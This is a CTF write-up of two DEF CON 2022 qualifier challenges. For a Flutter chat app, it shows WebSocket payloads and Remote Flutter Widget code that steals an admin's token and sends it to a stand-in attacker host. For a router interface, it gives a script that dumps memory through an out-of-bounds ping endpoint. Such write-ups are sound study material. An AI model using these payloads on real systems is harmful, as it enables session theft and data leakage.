# DEF CON CTF 2022 Qualifiers

I played this CTF with [Tea MSG](https://ctftime.org/team/154535), and we got 26th place - not too shabby!

![](<../.gitbook/assets/Screenshot 2022-06-02 at 7.29.42 PM.png>)

I attempted and contributed to solving [Discoteq](def-con-ctf-2022-qualifiers.md#discoteq-100) and [Router-ni](def-con-ctf-2022-qualifiers.md#router-ni-81).

## Discoteq \[100]

### Credits

Thanks to Ocean, quanyang, kokrui and waituck for the great teamwork here!:thumbsup:

### TL;DR

This was a Flutter-based chat application where we could send the admin any message that he would read. By manipulating Websocket requests, we could make the client load a malicious [remote Flutter widget](https://github.com/flutter/packages/tree/main/packages/rfw) that would steal the admin's token and send it back to us.

### Initial Observations

I was new to Flutter, so some time was spent analysing the `main.dart.js`, which is the Flutter app compiled by `dart2js`.

Although we can't view it from our end, we could see that there is an `AdminPage`, and a `/api/flag` endpoint that is fetched using `postRequestWithCookies`.

![](<../.gitbook/assets/Screenshot 2022-06-02 at 7.49.45 PM.png>)

It might help to find some other sensitive endpoints. In `LoginPage`, we could see that there is a `/api/token` endpoint. This endpoint returns our current authentication token.

![](<../.gitbook/assets/Screenshot 2022-06-02 at 8.00.19 PM.png>)

Now, let's take a look at the application itself! The goal was to send an exploit to the `admin#13371337` user. There were two main features - sending a normal message and sending a poll.&#x20;

When sending a poll, I noticed that there were some very suspicious parameters in the WebSocket message. By modifying the `apiGet` and `apiVote` paths, we get a callback on our server!

```json
{
    "type":"widget",
    "widget":"/widget/poll",
    "author":{
        "user":"test#9b808596",
        "platform":"web"
    },
    "recipients":["admin#13371337"],
    "data":{
        "title":"test",
        "apiGet":"@ATTACKER_URL",
        "apiVote":"@ATTACKER_URL"
    }
}
```

The `widget`, `apiGet`, and `apiVote` paths are appended to the base URL without sanitization - so using `@ATTACKER_URL` causes the following URL to be constructed:

`http://BASE_URL@ATTACKER_URL`

I tried some XSS payloads, hoping that the poll wasn't sanitized. Alas, a Flutter web app is entirely rendered on a `<canvas>`, so rendering unescaped HTML was hopeless.

I then tried to manipulate the `widget` parameter instead.

```json
{
    "type":"widget",
    "widget":"@ATTACKER_URL/test",
    "author":{
        "user":"abcd#c7e80dd5",
        "platform":"web"
    },
    "recipients":["admin#13371337"],
    "data":{
        "message":"test"
    }
}
```

Aha! This causes a traceback!

![](<../.gitbook/assets/image (87).png>)

Note: to avoid CORS issues, use the `Access-Control-Allow-Origin: *` header. For example, in Flask:

```python
@app.after_request
def after_request(response):
  response.headers['Access-Control-Allow-Methods']='*'
  response.headers['Access-Control-Allow-Origin']='*'
  response.headers['Vary']='Origin'
  return response
```

### What Even Is a Remote Flutter Widget?!

Ok so umm... I couldn't find this file signature anywhere, so the first step is to figure out what file format the file is expected to be in. We could download the original `/widget/chatmessage` widget and take a look:

![](<../.gitbook/assets/image (81) (1).png>)

This definitely contains styling and content information, but it isn't in an easily editable format.

&#x20;At this point my teammate kokrui found that this file was compiled with a package called [Remote Flutter Widgets](https://pub.dev/packages/rfw), which allows the loading of widgets hosted on external servers.

![](<../.gitbook/assets/Screenshot 2022-06-02 at 8.22.13 PM.png>)

By following the examples [on GitHub](https://github.com/flutter/packages/tree/main/packages/rfw), we could decode the `chatmessage` widget.&#x20;

```dart
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:rfw/formats.dart';

void main() {
  final Uint8List test = File('chatmessage.rfw').readAsBytesSync();
  var out = decodeLibraryBlob(test);
  print(out);
}
```

Ocean also found the `pollmessage` and `imagemessage` widgets.

![](<../.gitbook/assets/Screenshot 2022-06-02 at 8.32.09 PM.png>)

There is rather limited documentation and examples of the RFW syntax, so I followed the [`parseLibraryFile` documentation](https://pub.dev/documentation/rfw/latest/formats/parseLibraryFile.html), which seems to provide the most examples.

We tried various things, including this futile attempt to call the `Clipboard_getData` function we found in `main.dart.js`.

```dart
import core.widgets;
import local;

widget root = Container(
  color: 0xFFF,
  child: Center(
    child: Text(text: [
      "Hello, ", 
      data.author.user, 
      Clipboard_getData(format: "text/plain"), 
      " this is working!!"
    ], textDirection: "ltr"),
  ),
);
```

### onLoaded: Flag Please

Taking a closer look at `poll.dart` gave us some ideas.

```dart
// poll widget
import core.widgets;
import core.material;
import local;

widget root = Container({
  child: Column({
    children: [
      
      ...
      
      switch state.loaded {
        true: Column({
          children: [...for loop in data.poll_options:
            Row({
              children: [
                Padding({
                  child: ElevatedButton({
                    child: Text({
                      text: loop0.text
                    }),
                    onPressed: event api_post {
                      path: data.data.apiVote,
                      body: {selection: loop0.text}
                    }
                  }),
                  padding: [0.0, 5.0, 10.0, 0.0]
                }),
                Text({
                  text: loop0.count
                })
              ]}),
            
            ...
            
          ]
        }),
      null: ApiMapper({
        url: data.data.apiGet,
        jsonKey: options,
        dataKey: poll_options,
        onLoaded: set state.loaded = true
      })
    }]
  })
```

Notice that `ApiMapper` makes a GET request to the specified `apiGet` URL. The response data is then saved in `data.<dataKey>`, as we can see from the loop accessing `data.poll_options`.

Further, the `onPressed` event handler, `api_post`, seemingly provides a mechanism for us to exfiltrate our data.

For example, the following will fetch the poll options and exfiltrate them to `example.com`.

```dart
import core.widgets;
import core.material;
import local;

widget root { loaded: false } = Container(
  color: 0xFFF,
  child:
      switch state.loaded {
        true: 
          TextButton(
            child: Text(
              text: "HI",
            ),
            onPressed: event "api_post" {
              path: "@example.com",
              body: {
                selection: data.apiData
              }
            }
          ),
        false:
          ApiMapper(
            url: "/api/poll/options?poll=4b06175d-7f78-44b1-a132-183d6707a33a",
            jsonKey: "options",
            dataKey: "apiData",
            onLoaded: set state.loaded = true
          )
      }
);
```

There were still a few problems with this, though. The `/api/flag` endpoint requires a POST request, and `ApiMapper` only does GET requests. Additionally, we needed to make this zero-click.

The first part was simple enough - we just needed to steal the admin's token to authenticate as the admin, so something like this works:

```dart
ApiMapper(
    url: '/api/token',
    jsonKey: 'new_token',
    dataKey: 'token',
    onLoaded: set state.loaded = true
)
```

Next, the `onLoaded` event handler could be used to trigger the `api_post` event for zero-click exfiltration. But this was a bit iffy and only worked in some scenarios, such as the following one.

```dart
import local;
import core.widgets;

widget root { loaded: false }= Container(
    child:
      switch state.loaded {
          true:
              Column(
                children: [
                  Row(children: 
                    Center(children:
                      [
                        Text(text: data.token, textDirection: "ltr"),
                      ]
                    )
                  ),
                  ApiMapper(
                    url: '/api/token',
                    jsonKey: 'new_token',
                    dataKey: 'token',
                    onLoaded: event 'api_post' {
                      path: '@ATTACKER_URL',
                      body: {selection: data.token}
                    }
                  )
                ]
              ),
          false:
              ApiMapper(
                  url: '/api/token',
                  jsonKey: 'new_token',
                  dataKey: 'token',
                  onLoaded: set state.loaded = true
              )
      }
    
);

```

For example, here's me getting my own token.

![](<../.gitbook/assets/image (84).png>)

After getting the admin's token, we just needed to get the flag from `/api/flag`.

## Router-ni \[81]

### Credits

Thanks to Lord\_Idiot, waituck, bbbb and Gladiator for working on this challenge! :tada:

### TL;DR

The webpage provides an interface to a router, which includes a ping functionality.

![](<../.gitbook/assets/image (82) (2).png>)

Using the `/ping?id=` endpoint, we get the base64-encoded result of each ping request. Using a sufficiently large `id`, we could get an out-of-bound memory read.

### Solution

By enumerating the `id`, we would find that the ID range that corresponds to the router's RAM is from `18446744073709551463` to `18446744073709551615`. We could dump out the entire RAM this way.

```python
import requests
import base64

URL = "http://router-mlb4ta7v3lwam.shellweplayaga.me:31337/ping?id="
cookies = {'password': 'admin', 'username': 'admin'}

id = 18446744073709551463
decoded = b""

for i in range(152):
    r = requests.get(f"{URL}{id+i}", cookies=cookies)
    data = r.json()
    res = data["result"]
    decoded += base64.b64decode(res)

with open("out.bin", "wb+") as f:
    f.write(decoded)
```

We would find the following string:

![](<../.gitbook/assets/Screenshot 2022-06-02 at 9.47.09 PM.png>)

and guess that the flag is

`FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}`
